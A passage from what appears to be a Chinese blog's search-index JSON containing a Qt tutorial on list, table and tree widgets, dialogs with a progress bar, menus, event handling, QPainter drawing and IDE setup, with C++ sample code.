insertItems(int row, const QStringList \u0026labels); //获取ListWidget, item个数 int count() const; //获取当前行数据 QListWidgetItem *currentItem() const; int currentRow() const; //设置列表控件的编辑策略 void setEditTriggers(QAbstractItemView::EditTriggers triggers); enum EditTrigger { NoEditTriggers = 0, CurrentChanged = 1, DoubleClicked = 2, SelectedClicked = 4, EditKeyPressed = 8, AnyKeyPressed = 16, AllEditTriggers = 31 }; //排序 void sortItems(Qt::SortOrder order = Qt::AscendingOrder); //将列表控件的某一项,设置为控件 void setItemWidget(QListWidgetItem *item, QWidget *widget) //Public Slots void clear(); 事件信号: //鼠标键盘选中 void currentItemChanged(QListWidgetItem *current, QListWidgetItem *previous); void currentRowChanged(int currentRow); void currentTextChanged(const QString \u0026currentText); //激活, 双击 //可编辑状态下,双击不会触发该信号 void itemActivated(QListWidgetItem *item); //列表内容改变 //通过代码修改或者手动修改列表项显示的文字,会触发该信号 //通过代码新增列表数据,该信号并不会触发 void itemChanged(QListWidgetItem *item); //鼠标左键松开 void itemClicked(QListWidgetItem *item); //鼠标左键或右键双击 void itemDoubleClicked(QListWidgetItem *item); //在设置鼠标跟踪后,鼠标移上去,才会触发该信号 //setMouseTracking(true); void itemEntered(QListWidgetItem *item); //鼠标左键或右键按下 void itemPressed(QListWidgetItem *item); //选择改变 void itemSelectionChanged(); 示例: #include \u003cQListWidget\u003e #include \u003cQIcon\u003e #include \u003cQLineEdit\u003e luoqt::luoqt(QWidget* parent) : QWidget(parent) { ui.setupUi(this); //清空数据 ui.listWidget-\u003eclear(); //插入数据方式一 QListWidgetItem* item1 = new QListWidgetItem; item1-\u003esetText(\"item1\"); ui.listWidget-\u003eaddItem(item1); //插入数据方式二 new QListWidgetItem(\"item2\", ui.listWidget); //插入数据方式三 ui.listWidget-\u003eaddItem(\"item3\"); //插入包含图标的数据 QListWidgetItem* item4 = new QListWidgetItem; item4-\u003esetText(\"item4\"); item4-\u003esetIcon(QIcon(\":/luoqt/kenan.png\")); ui.listWidget-\u003eaddItem(item4); //插入其他控件, 如LineEdit QListWidgetItem* item5 = new QListWidgetItem(\"12\", ui.listWidget); QLineEdit* edtLine = new QLineEdit(\"item5 LineEdit\"); ui.listWidget-\u003esetItemWidget(item5, edtLine); //设置鼠标跟踪 //ui.listWidget-\u003esetMouseTracking(true); //设置编辑策略, 双击启用编辑状态 ui.listWidget-\u003esetEditTriggers(QAbstractItemView::DoubleClicked); //遍历listWidget中的每个item,设置属性 for (int i = 0; i \u003c ui.listWidget-\u003ecount(); i++) { ui.listWidget-\u003eitem(i)-\u003esetFlags(Qt::ItemIsEditable | Qt::ItemIsSelectable | Qt::ItemIsEnabled); } //设置排序, 升序 ui.listWidget-\u003esortItems(Qt::AscendingOrder); } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:16:0","tags":["Windows"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QTableWidget 属性: //标题显示(上方、左侧) horizontalHeader() verticalHeader() //滚动条显示 setVerticalScrollBarPolicy //选择模式,跟QListWidget一样 selectionMode //选择行、列、一项 //常用的是行选择 setSelectionBehavior //左上角全选按钮 标题上方和左侧都显示的时候,可以看到这个按钮 setCornerButtonEnabled //网格显示 setShowGrid setGridStyle //排序按钮 setSortingEnabled 事件信号: //在设置鼠标跟踪后,鼠标移上去,才会触发该信号,自定义widget不一定有效(Bug) //setMouseTracking(true); void cellEntered(int row, int column); void cellChanged(int row, int column); void cellClicked(int row, int column); void cellDoubleClicked(int row, int column); //仅 QTableWidgetItem 可触发下述信号 //在设置鼠标跟踪后,鼠标移上去,才会触发该信号,自定义widget无效 //setMouseTracking(true); void itemEntered(QTableWidgetItem *item); void itemChanged(QTableWidgetItem *item); void itemClicked(QTableWidgetItem *item); void itemDoubleClicked(QTableWidgetItem *item); //标题栏点击信号 //QTableWidget标题栏的类型为QHeaderView //可在QT手册中查看QHeaderView的信号事件 void sectionClicked(int logicalIndex); //代码进行绑定 QObject::connect(ui.tableWidget-\u003ehorizontalHeader(), SIGNAL(sectionClicked(int)), this, SLOT(SectionClicked(int))); 清空内容: #include \u003cQTableWidget\u003e #include \u003cQDebug\u003e #include \u003cQIcon\u003e #include \u003cQLabel\u003e #include \u003cQPixmap\u003e #include \u003cset\u003e #include \u003cQMessageBox\u003e ui.tableWidget-\u003esetColumnCount(0); ui.tableWidget-\u003esetRowCount(0); 插入标题: class LuoHeader :public QTableWidgetItem { public: LuoHeader::LuoHeader(QString qstr) : QTableWidgetItem(qstr) { } LuoHeader::~LuoHeader() { qDebug() \u003c\u003c this-\u003etext() \u003c\u003c \"removed\"; } }; //插入列标题 ui.tableWidget-\u003esetColumnCount(5); //方式1 ui.tableWidget-\u003esetHorizontalHeaderItem(0, new QTableWidgetItem(\"Col1\")); //方式2 ui.tableWidget-\u003esetHorizontalHeaderItem(1, new QTableWidgetItem); ui.tableWidget-\u003ehorizontalHeaderItem(1)-\u003esetText(\"Col2\"); //方式3 ui.tableWidget-\u003esetHorizontalHeaderItem(2, new LuoHeader(\"C3\")); //在同样的位置插入标题,会清理之前的对象,一会查看控制台,就会发现LuoHeader的析构函数会被调用 ui.tableWidget-\u003esetHorizontalHeaderItem(2, new LuoHeader(\"Col2\")); //设置标题列的宽度 ui.tableWidget-\u003esetColumnWidth(0, 200); //插入行标题 ui.tableWidget-\u003esetRowCount(3); //设置方式跟上面一样, 只不过要将Horizontal换成Vertical //这里展示一种不一样的玩法 QStringList qstrList = { \"Row1\", \"Row2\", \"Row3\" }; ui.tableWidget-\u003esetVerticalHeaderLabels(qstrList); 插入数据: int nRow = 0; int nCol = 0; //上面设置了 3行5列 //在0行0列、0行1列、0行2列添加内容 ui.tableWidget-\u003esetItem(0, 0, new QTableWidgetItem(\"Item 0, 0\")); ui.tableWidget-\u003esetItem(0, 1, new QTableWidgetItem(\"Item 0, 1\")); ui.tableWidget-\u003esetItem(0, 2, new QTableWidgetItem(\"Item 0, 2\")); //结尾添加一行 nRow = ui.tableWidget-\u003erowCount(); ui.tableWidget-\u003einsertRow(nRow); ui.tableWidget-\u003esetItem(nRow, 0, new QTableWidgetItem(\"ItemEnd\")); //开始添加一行 ui.tableWidget-\u003einsertRow(0); ui.tableWidget-\u003esetItem(0, 0, new QTableWidgetItem(\"ItemBegin\")); //插入QIcon图片 nRow = 0; nCol = 1; ui.tableWidget-\u003esetItem(nRow, nCol, new QTableWidgetItem); ui.tableWidget-\u003eitem(nRow, nCol)-\u003esetIcon(QIcon(\":/luoqt/kenan.png\")); //设置行高 ui.tableWidget-\u003esetRowHeight(nRow, 80); //设置图标显示大小 ui.tableWidget-\u003esetIconSize(QSize(ui.tableWidget-\u003erowHeight(nRow), ui.tableWidget-\u003erowHeight(nRow))); //插入Widget图片 nRow = 2; nCol = 0; QLabel* qLabel = new QLabel; QPixmap qPix(\":/luoqt/kenan.png\"); //缩放到和表格单元的宽高一致 qPix = qPix.scaled(ui.tableWidget-\u003ecolumnWidth(nCol), ui.tableWidget-\u003erowHeight(nRow)); qLabel-\u003esetPixmap(qPix); ui.tableWidget-\u003esetCellWidget(nRow, nCol, qLabel); //插入空数据 ui.tableWidget-\u003einsertRow(0); ui.tableWidget-\u003einsertRow(0); //设置每次选择以行为单位 ui.tableWidget-\u003esetSelectionBehavior(QAbstractItemView::SelectRows); 获取选中数据: //方式一 //这种方式,无法选择空行 qDebug() \u003c\u003c QStringLiteral(\"方式一--------------------------------\"); QList\u003cQTableWidgetItem*\u003e qTableItems = ui.tableWidget-\u003eselectedItems(); for (int i = 0; i \u003c qTableItems.size(); i++) { qDebug() \u003c\u003c qTableItems[i]-\u003erow() \u003c\u003c \":\" \u003c\u003c qTableItems[i]-\u003ecolumn() \u003c\u003c \" text=\" \u003c\u003c qTableItems[i]-\u003etext(); } //方式2 //这种方式,可以选择空行 qDebug() \u003c\u003c QStringLiteral(\"方式二--------------------------------\"); //选择模式器 QItemSelectionModel* qItemSelModel = ui.tableWidget-\u003eselectionModel(); //获取所有的选择索引 QModelIndexList qModelIndexLst = qItemSelModel-\u003eselectedIndexes(); //获取所有被选中的行号 std::set\u003cint\u003e stdRows; for (in","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:17:0","tags":["Windows"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QTreeWidget 属性: //标题显示与隐藏 header()-\u003esetVisible(true) //排序 setSortingEnabled //动画 setAnimated //滚动条显示 setVerticalScrollBarPolicy serHorizontalScrollBarPolicy //选择模式,跟QListWidget一样 selectionMode //选择行、列、一项 setSelectionBehavior 常用函数: //QTreeWidget //插入顶部节点 void insertTopLevelItem(int index, QTreeWidgetItem *item); void insertTopLevelItems(int index, const QList\u003cQTreeWidgetItem *\u003e \u0026items); void QTreeWidget::addTopLevelItem(QTreeWidgetItem *item); void QTreeWidget::addTopLevelItems(const QList\u003cQTreeWidgetItem *\u003e \u0026items); //获取顶部节点 QTreeWidgetItem *QTreeWidget::topLevelItem(int index) const; //获取顶部节点数量 int topLevelItemCount() const; //插入Widget控件 void QTreeWidget::setItemWidget(QTreeWidgetItem *item, int column, QWidget *widget); //获取选中节点 QList\u003cQTreeWidgetItem *\u003e QTreeWidget::selectedItems() const; //设置列数量 void setColumnCount(int columns); //QTreeWidgetItem //插入子节点 void addChild(QTreeWidgetItem *child); void addChildren(const QList\u003cQTreeWidgetItem *\u003e \u0026children); //设置文本 void setText(int column, const QString \u0026text); //获取父节点 QTreeWidgetItem* QTreeWidgetItem::parent() const; //获取treeWidget QTreeWidget* treeWidget() const; 槽函数: void clear(); //收缩 void collapseItem(const QTreeWidgetItem *item); //展开 void expandItem(const QTreeWidgetItem *item); 事件信号: void currentItemChanged(QTreeWidgetItem *current, QTreeWidgetItem *previous); void itemActivated(QTreeWidgetItem *item, int column); void itemChanged(QTreeWidgetItem *item, int column); void itemClicked(QTreeWidgetItem *item, int column); void itemCollapsed(QTreeWidgetItem *item); void itemDoubleClicked(QTreeWidgetItem *item, int column); void itemEntered(QTreeWidgetItem *item, int column); void itemExpanded(QTreeWidgetItem *item); void itemPressed(QTreeWidgetItem *item, int column); void itemSelectionChanged(); 清空内容: #include \u003cQTreeWidget\u003e #include \u003cQPushButton\u003e //清理标题,不清理数据 //ui.treeWidget-\u003esetColumnCount(0);//设置为0,不会清理 ui.treeWidget-\u003esetHeaderItem(new QTreeWidgetItem); //清空数据 ui.treeWidget-\u003eclear(); 插入标题: //设置4列 QTreeWidgetItem* pTreeHeader = ui.treeWidget-\u003eheaderItem(); pTreeHeader-\u003esetText(0, \"head1\"); pTreeHeader-\u003esetText(1, \"head2\"); pTreeHeader-\u003esetText(2, \"head3\"); pTreeHeader-\u003esetText(3, \"head4\"); 插入数据: //顶部节点插入 //在结尾处插入 //方式一 ui.treeWidget-\u003eaddTopLevelItem(new QTreeWidgetItem()); ui.treeWidget-\u003etopLevelItem(0)-\u003esetText(0, \"tree node1\"); ui.treeWidget-\u003etopLevelItem(0)-\u003esetText(1, \"tree node2\"); //方式二 ui.treeWidget-\u003eaddTopLevelItem(new QTreeWidgetItem({\"tree node11\", \"tree node22\"})); //在指定位置插入 ui.treeWidget-\u003einsertTopLevelItem(0, new QTreeWidgetItem({ \"tree node1-1\", \"tree node2-2\" })); //在结尾插入 ui.treeWidget-\u003einsertTopLevelItem(ui.treeWidget-\u003etopLevelItemCount(), new QTreeWidgetItem({ \"tree node End\" })); //子节点插入 //方式一 ui.treeWidget-\u003etopLevelItem(0)-\u003eaddChild(new QTreeWidgetItem({ \"child1\" ,\"child2\", \"child3\" })); / ui.treeWidget-\u003etopLevelItem(1)-\u003eaddChild(new QTreeWidgetItem({ \"child11\" })); //方式二 QTreeWidgetItem* pTreeItem = ui.treeWidget-\u003etopLevelItem(1); ui.treeWidget-\u003eaddTopLevelItem(new QTreeWidgetItem(pTreeItem, { \"child110012\" })); //插入图标 ui.treeWidget-\u003esetIconSize(QSize(60, 60)); ui.treeWidget-\u003etopLevelItem(0)-\u003esetIcon(0, QIcon(\":/luoqt/ke nan.png\")); //插入Widget控件 QPushButton* btn = new QPushButton(\"test\"); ui.treeWidget-\u003esetItemWidget(ui.treeWidget-\u003etopLevelItem(1), 0, btn); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:18:0","tags":["Windows"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QDialog 常用函数: //拿Dialog的返回值,与exec的返回值一样 int QDialog::result() const; 槽函数: //默认显示的是非模态对话框. //可在show前调用setModal(true),或者setWindowModality(Qt::ApplicationModal),将其设置为模态对话框. void QWidget::show(); //阻塞,有返回值, 显示的是模态对话框. virtual int exec(); //可将一个按钮的点击信号与下述槽函数绑定 //exec的返回值为 QDialog::Accepted virtual void accept(); //exec的返回值为 QDialog::Rejected virtual void reject(); //可在与按钮点击信号绑定的槽函数中调用,这样就可以自定义exec的返回值为 r virtual void done(int r); 自定义MessageBox: 新建一个Qt类继承QDialog 自定义界面 可以弄一个QLabel控件用来显示要提示的信息, 将确认按钮与QDialog的槽函数accept绑定, 将取消按钮与QDialog的槽函数reject绑定. QProgressBar应用: 新建一个线程类,模拟做事: LuoThread.h: #include \u003cQThread\u003e class LuoThread : public QThread { Q_OBJECT public: LuoThread(); ~LuoThread(); protected: void run(); signals: ///0~1000 void SetPos(int pos); }; LuoThread.cpp: #include \"luothread.h\" LuoThread::LuoThread() { } LuoThread::~LuoThread() { } void LuoThread::run() { //模拟做事 //这个地方需要设置QProgressBar的范围为0-1000 for (int i = 0; i \u003c= 1000; i++) { SetPos(i); msleep(5); } } 新建一个对话框类,显示进度: LuoProgressDialog.h: #include \u003cQDialog\u003e #include \u003cQThread\u003e #include \"ui_LuoProgressDialog.h\" class LuoProgressDialog : public QDialog { Q_OBJECT public: LuoProgressDialog(QWidget *parent = Q_NULLPTR); ~LuoProgressDialog(); public slots: //0~1000 void SetPos(int pos); private: Ui::LuoProgressDialog ui; }; LuoProgressDialog.cpp: #include \"LuoProgressDialog.h\" LuoProgressDialog::LuoProgressDialog(QWidget *parent) : QDialog(parent) { ui.setupUi(this); //为了实现圆角效果,在QDialog上面放一个QWidget控件 //在QWidget控件上面放一个QProgressBar控件 //去掉标题栏 this-\u003esetWindowFlags(Qt::FramelessWindowHint); //设置背景透明 this-\u003esetAttribute(Qt::WA_TranslucentBackground, true); } LuoProgressDialog::~LuoProgressDialog() { } void LuoProgressDialog::SetPos(int pos) { ui.progressBar-\u003esetValue(pos); if (pos == 1000) { for (int i = 100; i \u003e 0; i--) { //透明度 1.0 0.0 this-\u003esetWindowOpacity((float)i / 100.0); QThread::msleep(10); //界面上有一个QLabel控件 //这个地方的setText只是发出信号,需要等待槽函数进行处理 //LuoProgressDialog::SetPos(int pos)这个槽函数不退出,setText的槽函数是不会处理的 ui.label-\u003esetText(QString::number(i)); //这一步会将消息队列中的消息都处理下,会立即调用槽函数 QEventLoop loop; loop.processEvents(); } this-\u003eclose(); } } 为了实现圆角效果,需要设置QWidget的样式为: #widget{ background-color: qlineargradient(spread:reflect, x1:0.999896, y1:0.494136, x2:1, y2:1, stop:0 rgba(0, 0, 0, 255), stop:1 rgba(255, 255, 255, 255)); border:1px groove rgb(232, 232, 232); border-radius:20; } Main中调用: #include \"luothread.h\" #include \"LuoProgressDialog.h\" int main(int argc, char *argv[]) { QApplication a(argc, argv); //进度条 LuoProgressDialog luoPro; //线程 LuoThread luoThread; //信号槽绑定 QObject::connect(\u0026luoThread, SIGNAL(SetPos(int)), \u0026luoPro, SLOT(SetPos(int))); //启动线程 luoThread.start(); //显示对话框 luoPro.exec(); return a.exec(); } QDialog.7z ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:19:0","tags":["Windows"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"Qt菜单 Widget创建菜单: 添加菜单 LuoWidget::LuoWidget(QWidget *parent) : QWidget(parent) { ui.setupUi(this); //插入菜单栏 QMenuBar* m = new QMenuBar(this); //设置菜单栏大小 m-\u003eresize(width(), m-\u003eheight()); //一级菜单 QMenu* m1 = m-\u003eaddMenu(QStringLiteral(\"菜单1\")); //二级菜单 QAction* a1 = m1-\u003eaddAction(QStringLiteral(\"二级菜单1.1\")); QAction* a2 = m1-\u003eaddAction(QStringLiteral(\"二级菜单1.2\")); QAction* a3 = m1-\u003eaddAction(QStringLiteral(\"二级菜单1.3\")); //设置图标 a3-\u003esetIcon(QIcon(\":/LuoMenu/ke nan.png\")); //三级菜单 QMenu* m14 = m1-\u003eaddMenu(QStringLiteral(\"二级菜单1.4\")); m14-\u003eaddAction(QStringLiteral(\"三级菜单1.4.1\")); //设置图标 m14-\u003esetIcon(QIcon(\":/LuoMenu/ke nan.png\")); //一级菜单 QMenu* m2 = m-\u003eaddMenu(QStringLiteral(\"菜单2\")); QMenu* m3 = m-\u003eaddMenu(QStringLiteral(\"菜单3\")); } 事件信号 //QMenuBar void hovered(QAction *action); void triggered(QAction *action); //QMenu void hovered(QAction *action); void triggered(QAction *action); //QAction void changed(); void hovered(); void toggled(bool checked); void triggered(bool checked = false); //槽函数 public slots: void Hover() { qDebug() \u003c\u003c \"Hover\"; } void Action1() { qDebug() \u003c\u003c \"Action1\"; } void Action(QAction* act) { qDebug() \u003c\u003c \"Action \" \u003c\u003c act-\u003etext(); } //进行绑定 //一级菜单 m1 = m-\u003eaddMenu(QStringLiteral(\"菜单1\")); //QMenu所有子节点(子节点的子节点)点击后,都会触发该信号 connect(m1, SIGNAL(triggered(QAction*)), this, SLOT(Action(QAction*))); //二级菜单 QAction* a1 = m1-\u003eaddAction(QStringLiteral(\"二级菜单1.1\")); //QAction 触发信号 connect(a1, SIGNAL(triggered()), this, SLOT(Action1())); QAction* a2 = m1-\u003eaddAction(QStringLiteral(\"二级菜单1.2\")); //QAction 鼠标悬停信号 connect(a2, SIGNAL(hovered()), this, SLOT(Hover())); 动态产生菜单 //槽函数 void Hovered(QAction* act) { //动态菜单 if (act-\u003etext() == QStringLiteral(\"菜单3\")) { act-\u003emenu()-\u003eclear(); act-\u003emenu()-\u003eaddAction(QStringLiteral(\"菜单3.1\")); act-\u003emenu()-\u003eaddAction(QStringLiteral(\"菜单3.2\")); act-\u003emenu()-\u003eaddAction(QStringLiteral(\"菜单3.3\")); } } //信号槽绑定 //插入菜单栏 QMenuBar* m = new QMenuBar(this); //悬停,动态菜单生成 connect(m, SIGNAL(hovered(QAction*)), this, SLOT(Hovered(QAction*))); 菜单单选和多选 //槽函数 void Action1(bool b) { qDebug() \u003c\u003c \"Action1 \" \u003c\u003c b; } //二级菜单 QAction* a1 = m1-\u003eaddAction(QStringLiteral(\"二级菜单1.1\")); QAction* a2 = m1-\u003eaddAction(QStringLiteral(\"二级菜单1.2\")); QAction* a3 = m1-\u003eaddAction(QStringLiteral(\"二级菜单1.3\")); //设置可选 a1-\u003esetCheckable(true); a2-\u003esetCheckable(true); a3-\u003esetCheckable(true); //添加到组 QActionGroup* ag = new QActionGroup(this); ag-\u003eaddAction(a2); ag-\u003eaddAction(a3); //单选 ag-\u003esetExclusive(true); //是否选中 connect(a1, SIGNAL(triggered(bool)), this, SLOT(Action1(bool))); //添加快捷键 a1-\u003esetShortcut(QString(\"A\")); 按钮菜单 //准备一个按钮,响应点击事件 //按钮点击事件 void Click() { //鼠标位置显示菜单 //m1的类型是QMenu m1-\u003eexec(QCursor::pos()); } QMenuBar* m = new QMenuBar(this); //设置菜单栏大小 m-\u003eresize(width(), m-\u003eheight()); //一级菜单 m1 = m-\u003eaddMenu(QStringLiteral(\"菜单1\")); //二级菜单 QAction* a1 = m1-\u003eaddAction(QStringLiteral(\"二级菜单1.1\")); QAction* a2 = m1-\u003eaddAction(QStringLiteral(\"二级菜单1.2\")); QAction* a3 = m1-\u003eaddAction(QStringLiteral(\"二级菜单1.3\")); //三级菜单 QMenu* m14 = m1-\u003eaddMenu(QStringLiteral(\"二级菜单1.4\")); m14-\u003eaddAction(QStringLiteral(\"三级菜单1.4.1\")); 点击按钮的时候,就会弹出菜单. 工具栏 #include \u003cQToolBar\u003e QToolBar* tBar = new QToolBar(this); tBar-\u003esetGeometry(0, m-\u003eheight(), width(), 30); tBar-\u003esetIconSize(QSize(30, 30)); tBar-\u003eaddAction(a1); 状态栏 #include \u003cQStatusBar\u003e QStatusBar* sBar = new QStatusBar(this); sBar-\u003esetGeometry(0, height() - 30, width(), 30); sBar-\u003eshowMessage(QStringLiteral(\"测试消息3秒消失!\"), 3000); QMainWindow: QMainWindow继承QWidget,封装了很多操作. QMainWindow │ ├─QMenuBar ├ └─QMenu ├ └─QAction ├─QToolBar └─QStatusBar 菜单栏: //一级菜单 QMenu* m1 = this-\u003emenuBar()-\u003eaddMenu(QStringLiteral(\"菜单1\")); //二级菜单 QAction* a11 = m1-\u003eaddAction(QStringLiteral(\"菜单1.1\")); QAction* a12 = m1-\u003eaddAction(QStringLiteral(\"菜单1.2\")); QAction* a13 = m1-\u003eaddAction(QStringLiteral(\"菜单1.3\")); //添加图标 a12-\u003esetIcon(QIcon(\":/LuoMenu/ke nan.png\")); //一级菜单 QMenu* m2 = this-\u003emenuBar()-\u003eaddMenu(QStringLiteral(\"菜单2\")); QMenu* m3 = this-\u003emenuBar()-\u003eaddMenu(QStringLiteral(\"菜单3\")); 工具栏: ui.mainToolBar-\u003eaddAction(a11); ui.mainToolBar-\u003eaddAction(a12); ui.mainToolBar-\u003eadd","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:20:0","tags":["Windows"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"Qt事件 重载Qt事件有2种方式: 重载event这个虚函数,在里面判断event的类型, 重载各自的事件虚函数(如 keyPressEvent). QEvent 重载事件: virtual bool event(QEvent *event) override; 示例: //声明 public: //重载event bool event(QEvent* ev); //实现 bool LuoEvent::event(QEvent* ev) { switch (ev-\u003etype()) { case QEvent::KeyPress: { //键盘事件 //推荐重载keyPressEvent或keyReleaseEvent QKeyEvent* keyEv = (QKeyEvent*)ev; //判断是否是自动触发的 if (!keyEv-\u003eisAutoRepeat()) { //这个输出的是大写 qDebug() \u003c\u003c (char)keyEv-\u003ekey(); //这个可以区分大小写 qDebug() \u003c\u003c keyEv-\u003etext(); if (keyEv-\u003ekey() == 'A') { //返回true表示已被处理 return true; } } } case QEvent::MouseButtonPress: { //鼠标事件 QMouseEvent* me = (QMouseEvent*)ev; //相对坐标(本地坐标) qDebug() \u003c\u003c \"QEvent::MouseButtonPress \" \u003c\u003c QStringLiteral(\"相对坐标 \") \u003c\u003c me-\u003ex() \u003c\u003c me-\u003ey(); //程序窗口坐标 qDebug() \u003c\u003c \"QEvent::MouseButtonPress \" \u003c\u003c QStringLiteral(\"程序窗口坐标 \") \u003c\u003c me-\u003ewindowPos().x() \u003c\u003c me-\u003ewindowPos().y(); //屏幕坐标 qDebug() \u003c\u003c \"QEvent::MouseButtonPress \" \u003c\u003c QStringLiteral(\"屏幕坐标 \") \u003c\u003c me-\u003escreenPos().x() \u003c\u003c me-\u003escreenPos().y(); //本地坐标转屏幕坐标 QPoint gPos = mapToGlobal(me-\u003epos()); qDebug() \u003c\u003c \"QEvent::MouseButtonPress \" \u003c\u003c QStringLiteral(\"本地坐标转屏幕坐标 \") \u003c\u003c gPos.x() \u003c\u003c gPos.y(); //获取鼠标的屏幕坐标 qDebug() \u003c\u003c \"QCursor\" \u003c\u003c QCursor::pos().x() \u003c\u003c QCursor::pos().y(); //鼠标按钮事件 if (me-\u003ebuttons() \u0026 Qt::LeftButton) { qDebug() \u003c\u003c \"LeftButton\"; } if (me-\u003ebuttons() \u0026 Qt::RightButton) { qDebug() \u003c\u003c \"RightButton\"; } if (me-\u003ebuttons() \u0026 Qt::MiddleButton) { qDebug() \u003c\u003c \"MiddleButton\"; } } case QEvent::Resize: { //窗口大小改变事件 QResizeEvent* re = (QResizeEvent*)ev; qDebug() \u003c\u003c \"Resize Old \" \u003c\u003c re-\u003eoldSize() \u003c\u003c \"Resize New \" \u003c\u003c re-\u003esize(); } default: break; } return QWidget::event(ev); } 键盘事件 重载事件: virtual void keyPressEvent(QKeyEvent *event); virtual void keyReleaseEvent(QKeyEvent *event); 示例: //声明 public: //键盘事件 void keyPressEvent(QKeyEvent* ev); void keyReleaseEvent(QKeyEvent* ev); //实现 void LuoEvent::keyPressEvent(QKeyEvent* ev) { //键盘按下某个按键后,会多次响应 //解决键盘按钮连发现象,判断是否是自动触发的,若是则返回 if (ev-\u003eisAutoRepeat()) { return; } qDebug() \u003c\u003c \"keyPressEvent \" \u003c\u003c ev-\u003ekey(); } void LuoEvent::keyReleaseEvent(QKeyEvent* ev) { if (ev-\u003eisAutoRepeat()) { return; } qDebug() \u003c\u003c \"keyReleaseEvent \" \u003c\u003c ev-\u003ekey(); } 鼠标事件 重载事件: //鼠标移进来 virtual void enterEvent(QEvent *event); //鼠标移出去 virtual void leaveEvent(QEvent *event); virtual void mouseDoubleClickEvent(QMouseEvent *event); //鼠标移动事件,需要开启鼠标跟踪,setMouseTracking(true) virtual void mouseMoveEvent(QMouseEvent *event); virtual void mousePressEvent(QMouseEvent *event); virtual void mouseReleaseEvent(QMouseEvent *event); 坐标: //相对坐标(本地坐标) //相对于Widget的位置 int QMouseEvent::x() const; int QMouseEvent::y() const; //程序窗口坐标 //相对于程序窗口的位置 const QPointF \u0026QMouseEvent::windowPos() const; //屏幕坐标 //相对于屏幕的位置 const QPointF \u0026QMouseEvent::screenPos() const; //本地坐标转屏幕坐标 QPoint mapToGlobal(const QPoint \u0026pos) const; //获取鼠标的屏幕坐标 [static] QPoint QCursor::pos(); 按键: //获取按键状态,鼠标的哪个键被按下 Qt::MouseButtons QMouseEvent::buttons() const; enum MouseButton { NoButton = 0x00000000, LeftButton = 0x00000001, RightButton = 0x00000002, MidButton = 0x00000004, // ### Qt 6: remove me MiddleButton = MidButton, ... }; 窗口大小改变 可重载该事件来解决不同电脑屏幕分辨率不同,而导致的控件显示异常的现象. 重载事件: virtual void resizeEvent(QResizeEvent *event); 示例: //声明 public: //窗口大小改变事件 void resizeEvent(QResizeEvent* re); //实现 void LuoEvent::resizeEvent(QResizeEvent* re) { qDebug() \u003c\u003c \"resizeEvent\"; //窗口改变前的大小 //re-\u003eoldSize() //窗口改变后的大小 //re-\u003esize() } Qt事件.7z ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:21:0","tags":["Windows"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QPainter 重载事件: virtual void paintEvent(QPaintEvent *event); 绘制文本: //声明 public: //重载这个虚函数 void paintEvent(QPaintEvent* event); //实现 void LuoPaint::paintEvent(QPaintEvent* event) { //设置绘制设备 (Widget) QPainter p(this); //设置画笔颜色 p.setPen(QColor(255, 0, 0, 200)); //设置字体 //p.setFont(QFont(QStringLiteral(\"黑体\"), 30)); //这样设置之后,我们在字体选中控件中选择字体后,界面的绘制的字体没有改变 //我们需要调用update这个槽函数,来刷新界面 QFont font = ui.fontComboBox-\u003ecurrentFont(); font.setPixelSize(30); p.setFont(font); //绘制文本 p.drawText(100, 100, QStringLiteral(\"测试文字\")); } 注意 我们通过字体选择控件选择字体后,需要调update这个槽函数来刷新界面. 绘制线: //声明 public: //重载这个虚函数 void paintEvent(QPaintEvent* event); //实现 void LuoPaint::paintEvent(QPaintEvent* event) { //设置绘制设备 (Widget) QPainter p(this); //绘制线 //设置画笔样式 QPen pen; //实线 pen.setStyle(Qt::SolidLine); //线粗 pen.setWidth(30); //线刷子 pen.setBrush(Qt::red); //结尾端样式 pen.setCapStyle(Qt::RoundCap); //连接处样式 pen.setJoinStyle(Qt::RoundJoin); p.setPen(pen); QVector\u003cQLine\u003e lines; lines.push_back(QLine(0, 0, 350, 350)); lines.push_back(QLine(350, 350, 0, 450)); lines.push_back(QLine(0, 450, 550, 550)); p.drawLines(lines); p.end(); } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:22:0","tags":["Windows"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"Qt配置 VS2019dark.xml 将上述黑色方案放到Qt目录\\Tools\\QtCreator\\share\\qtcreator\\styles. 在QtCreator中工具-\u003e选项-\u003e环境-\u003etheme,选择dark. 在QtCreator中工具-\u003e选项-\u003e文本编辑器,选择VS2019. 控制台: 方便调试,看输出信息. QtCreator: VS: VS番茄插件设置: 环境变量: 添加环境变量: Qt_INCLUDEPATH_ = D:\\QT\\5.12.10\\msvc2017_64\\include 按上述设置后,可解决某些情况下在VS中写Qt代码不提示,工程标红等现象. VS工程标红: 右键.ui文件,编译. 右键解决方案,重新扫描解决方案. 